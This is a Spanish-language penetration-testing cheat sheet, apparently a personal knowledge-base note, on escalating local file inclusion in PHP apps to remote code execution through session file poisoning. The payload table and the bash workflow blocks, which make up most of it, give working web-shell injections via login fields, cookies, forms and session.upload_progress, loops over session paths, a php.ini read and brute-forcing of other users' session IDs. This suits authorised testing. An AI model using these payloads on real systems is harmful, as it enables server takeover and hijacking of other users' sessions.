---
aliases: null
tags:
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[File Inclusion]]'
---
# LFI To RCE - Session File Poisoning

***

## Cheatsheet

| **Payload / Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Login con username `<?php system($_GET['cmd']); ?>` → `?page=/var/lib/php/sessions/sess_$PHPSESSID&cmd=id` | Session file con PHP inyectado, ejecutado al incluirlo | Username/preferencia se guarda en `$_SESSION`. Debian/Ubuntu path. |
| Mismo en RHEL/CentOS: `?page=/var/lib/php/session/sess_$PHPSESSID&cmd=id` | Path variante (singular) | RHEL/CentOS. |
| Setear cookie `language=<?php system($_GET["cmd"]); ?>` (si app lo guarda en session) → incluir session | Cookie value que persiste en session | App con `$_SESSION['language'] = $_COOKIE['language']`. |
| `curl 'https://target/profile' -b 'PHPSESSID=ABC' -d 'pref=<?php system($_GET["cmd"]); ?>'` luego `?page=/tmp/sess_ABC&cmd=id` | Form field guardado en session | Endpoints de preferencias. |
| `?page=C:\Windows\Temp\sess_$PHPSESSID&cmd=id` | Path Windows | Stack PHP Windows. |
| Leer `php://filter/convert.base64-encode/resource=/etc/php/X/apache2/php.ini` para sacar `session.save_path` | Verificar path real de sessions | Path desconocido. |
| `curl 'https://target/upload' -b 'PHPSESSID=ABC' --data 'PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET["cmd"]); ?>'` | `session.upload_progress` envenena session sin campo de usuario | `session.upload_progress.enabled=On` (default). |
| `?page=/proc/$PID/cwd/sess_ABC` o iterar PIDs | Path via /proc cuando session_save_path es custom | Apps que usan cwd no-standard. |
| Brute-force `for s in $(cat session_ids.txt); do curl "?page=/tmp/sess_$s"; done` | Recuperar session IDs de otros usuarios via predicción | Sesiones predecibles, victim known. |
^lfi-sessionpoisoning

### Workflow

```bash
TARGET="https://target"
PHPSESSID=$(curl -sI "$TARGET" | grep -i 'set-cookie:.*PHPSESSID' | grep -oE 'PHPSESSID=[a-zA-Z0-9]+' | head -1 | cut -d= -f2)
echo "[+] My PHPSESSID: $PHPSESSID"

# 1. Inyectar PHP en algún campo que la app guarde en $_SESSION
curl -s -b "PHPSESSID=$PHPSESSID" -d 'username=<?php system($_GET["cmd"]); ?>' "$TARGET/login"

# 2. Probar paths de session
for path in \
    "/var/lib/php/sessions/sess_$PHPSESSID" \
    "/var/lib/php/session/sess_$PHPSESSID" \
    "/tmp/sess_$PHPSESSID" \
    "/var/php_sessions/sess_$PHPSESSID" \
    "C:\\Windows\\Temp\\sess_$PHPSESSID"; do
  echo "=== $path ==="
  curl -s -b "PHPSESSID=$PHPSESSID" "$TARGET/?page=$path&cmd=id"
done
```

### Workflow — session.upload_progress (sin campo de user)

```bash
TARGET="https://target"
PHPSESSID=$(curl -sI "$TARGET" | grep -oE 'PHPSESSID=[a-zA-Z0-9]+' | head -1 | cut -d= -f2)

# Trigger session creation + envenena con PHP_SESSION_UPLOAD_PROGRESS
curl -s "$TARGET/upload" \
  -b "PHPSESSID=$PHPSESSID" \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET["cmd"]); ?>' \
  -F 'file=@/etc/hosts'

# Incluir
curl -s "$TARGET/?page=/var/lib/php/sessions/sess_$PHPSESSID&cmd=id"
```

### Encontrar `session.save_path` via LFI read

```bash
# Si LFI permite leer config PHP
for path in '/etc/php/7.4/apache2/php.ini' '/etc/php/8.0/apache2/php.ini' '/etc/php.ini' '/usr/local/etc/php.ini'; do
  curl -s "$TARGET/?page=php://filter/convert.base64-encode/resource=$path" | base64 -d 2>/dev/null | grep session.save_path
done
```

___

## Overview

Cuando la app guarda input en `$_SESSION['x']`, PHP lo serializa al archivo de session. Si LFI incluye ese file, ejecuta el PHP serializado.

**Vectores de inyección:**
- Username/email en login.
- Preferencias (idioma, tema).
- Form data en wizards.
- Cookie values reflejados en session.
- `session.upload_progress` (default On en PHP) — funciona sin campo de user.

**Requisitos:**
- LFI confirmado con `include()` que ejecuta PHP.
- Webserver con permisos read sobre `session.save_path`.
- Conocer/obtener tu PHPSESSID (visible en `Set-Cookie`).

**Paths default:**
- Debian/Ubuntu: `/var/lib/php/sessions/`
- RHEL/CentOS: `/var/lib/php/session/`
- macOS/BSD: `/tmp/`
- Windows: `C:\Windows\Temp\`

***
